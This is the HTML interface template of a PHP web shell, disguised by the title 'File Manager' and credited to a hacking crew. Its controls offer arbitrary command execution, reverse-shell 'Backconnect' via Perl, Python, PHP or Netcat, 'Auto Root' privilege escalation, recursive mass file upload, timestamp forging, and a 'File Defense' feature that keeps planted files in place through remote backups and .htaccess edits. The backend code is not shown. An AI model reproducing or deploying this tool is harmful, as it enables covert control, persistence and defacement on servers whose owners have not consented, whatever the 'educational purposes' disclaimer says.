<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="z_csrf_token" content="%%CSRF_TOKEN%%">
    <title>File Manager</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="%%CSS_URL%%">
    <script src="https://cdn.jsdelivr.net/npm/ansi_up@5.2.1/ansi_up.min.js"></script>
</head>
<body>
    <main>
        <h2 class="banner">y4n9b3n3r4aj4d3k! Sh3llz</h2>
        <div class="box server-info-container">
            %%SERVER_INFO%%
        </div>
        <div class="box">
            <div class="breadcrumbs-container">
                <div class="breadcrumbs" id="breadcrumbs-list">%%BREADCRUMBS%%</div>
                <a title="Go to script directory" class="home-btn" onclick="navigateTo('%%HOME_DIR_HEX%%')">üè†</a>
            </div>
            <div class="top-actions">
                <label for="upload-input" class="button button-secondary">Choose Files</label>
                <input type="file" name="files[]" id="upload-input" multiple required style="display:none;">
                <button id="remote-upload-btn" class="button button-secondary">Remote Upload</button>
                <button id="mass-upload-btn" class="button button-secondary">Mass Upload</button>
                <button id="defense-btn" class="button-secondary">File Defense</button>
                <button id="backconnect-btn" class="button-secondary">Backconnect</button>
                <button id="cmd-btn" class="button-secondary">Command</button>
                <button id="ps-btn" class="button-secondary">Processes</button>
                <button id="vuln-scan-btn" class="button-secondary">Vuln Scan</button>
                <button id="auto-root-btn" class="button-danger">Auto Root</button>
                <div class="right-stack"><button id="create-new-btn" class="button-secondary">Create New</button><button id="about-btn" class="button-secondary">About</button></div>
            </div>
        </div>
        <div class="box">
            <form id="file-list-form">
            <div class="table-wrapper">
            <table>
                <thead><tr><th style="width: 1%;"><input type="checkbox" id="select-all-checkbox"></th><th>Name</th><th>Owner</th><th>Modified</th><th>Size</th><th>Permissions</th><th>Actions</th></tr></thead>
                <tbody id="file-list-tbody">%%FILE_LIST%%</tbody>
            </table>
            </div>
            <div class="table-actions"><button type="button" id="delete-selected-btn" class="button-danger">Delete Selected</button></div>
            </form>
        </div>
    </main>
    <footer>y4n9b3n3r4aj4d3k! Sh3llz - z3r0-team!</footer>
    <div id="message-area"></div>
    <div id="long-task-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title" id="long-task-modal-title"></h2><button class="close-btn" onclick="hideModal('long-task-modal')">√ó</button></div><div class="modal-body"><pre id="long-task-output"></pre></div></div></div>
    <div id="view-edit-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title" id="view-edit-modal-title"></h2><button class="close-btn" onclick="hideModal('view-edit-modal')">√ó</button></div><div class="modal-body" id="view-edit-modal-body"></div><div class="modal-footer" id="view-edit-modal-footer"></div></div></div>
    <div id="create-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Create New</h2><button class="close-btn" onclick="hideModal('create-modal')">√ó</button></div><form id="create-form"><div class="modal-body"><input type="text" name="name" placeholder="Enter name..." required><div class="radio-group"><label><input type="radio" name="create_type" value="file" checked> File</label><label><input type="radio" name="create_type" value="dir"> Directory</label></div></div><div class="modal-footer"><button type="submit">Create</button></div></form></div></div>
    <div id="command-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Command Execution</h2><button class="close-btn" onclick="hideModal('command-modal')">√ó</button></div><form id="exec-form"><div class="modal-body"><input type="text" name="cmd" placeholder="ls -la" required><pre id="command-output" style="display: none;"></pre></div><div class="modal-footer"><button type="submit">Execute</button></div></form></div></div>
    <div id="chmod-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Change Permissions</h2><button class="close-btn" onclick="hideModal('chmod-modal')">√ó</button></div><form id="chmod-form"><div class="modal-body"><input type="text" name="perms" placeholder="e.g., 0755" required pattern="[0-7]{4}"><input type="hidden" name="z_ph_1"></div><div class="modal-footer"><button type="submit">Change</button></div></form></div></div>
    <div id="touch-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Change Timestamp</h2><button class="close-btn" onclick="hideModal('touch-modal')">√ó</button></div><form id="touch-form"><div class="modal-body"><input type="text" name="datetime" placeholder="YYYY-MM-DD HH:MM:SS" required><input type="hidden" name="z_ph_1"></div><div class="modal-footer"><button type="submit">Change</button></div></form></div></div>
    <div id="mass-upload-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Mass Upload</h2><button class="close-btn" onclick="hideModal('mass-upload-modal')">√ó</button></div><form id="mass-upload-form"><div class="modal-body"><input type="text" name="target_dir" placeholder="Target Directory" required><input type="text" name="filename" placeholder="Filename" required><textarea name="content" placeholder="File content..."></textarea><div class="checkbox-group"><label><input type="checkbox" name="recursive" checked> Massal (rekursif)</label></div></div><div class="modal-footer"><button type="submit">Start Upload</button></div></form></div></div>
    <div id="remote-upload-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Remote File Upload</h2><button class="close-btn" onclick="hideModal('remote-upload-modal')">√ó</button></div><form id="remote-upload-form"><div class="modal-body"><input type="text" name="url" placeholder="https://example.com/file.txt" required><input type="text" name="filename" placeholder="Save as (optional)"></div><div class="modal-footer"><button type="submit">Upload</button></div></form></div></div>
    <div id="defense-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">File Defense</h2><button class="close-btn" onclick="hideModal('defense-modal')">√ó</button></div><form id="defense-form"><div class="modal-body"><input type="text" name="target_file" placeholder="Full path to target file to protect" required><input type="text" name="backup_url" placeholder="URL to raw backup content" required><input type="text" name="htaccess_path" placeholder="Full path to .htaccess file to modify" required></div><div class="modal-footer"><button type="submit">Lock & Protect</button></div></form></div></div>
    <div id="about-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">About</h2><button class="close-btn" onclick="hideModal('about-modal')">√ó</button></div><div class="modal-body"><p class="credit">./s3nt1n3L - z3r0-team!</p><p>This tool is for educational purposes only.</p></div><div class="modal-footer"><button type="button" onclick="hideModal('about-modal')">Close</button></div></div></div>
    <div id="processes-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Running Processes</h2><button class="close-btn" onclick="hideModal('processes-modal')">√ó</button></div><div class="modal-body"><pre id="processes-output"></pre></div></div></div>
    <div id="phpinfo-modal" class="modal-backdrop"><div class="modal" style="max-width: 1000px;"><div class="modal-header"><h2 class="modal-title">PHP Info</h2><button class="close-btn" onclick="hideModal('phpinfo-modal')">√ó</button></div><div class="modal-body" id="phpinfo-output"></div></div></div>
    <div id="backconnect-modal" class="modal-backdrop"><div class="modal"><div class="modal-header"><h2 class="modal-title">Backconnect</h2><button class="close-btn" onclick="hideModal('backconnect-modal')">√ó</button></div><form id="backconnect-form"><div class="modal-body"><input type="text" name="ip" placeholder="IP Address" required><input type="text" name="port" placeholder="Port" required><select name="method" class="button-secondary" style="width:100%;padding:0.6rem;"><option value="perl">Perl</option><option value="python3">Python3</option><option value="php">PHP</option><option value="nc">Netcat</option></select></div><div class="modal-footer"><button type="submit">Connect</button></div></form></div></div>
    
    <script>
        window.PHP_DATA = {
            csrfToken: "%%CSRF_TOKEN%%",
            csrfKey: "%%CSRF_KEY%%",
            currentPathHex: "%%CURRENT_PATH_HEX%%",
            dirParamKey: "%%DIR_PARAM_KEY%%"
        };
    </script>
    <script src="%%JS_URL%%"></script>
</body>
</html>
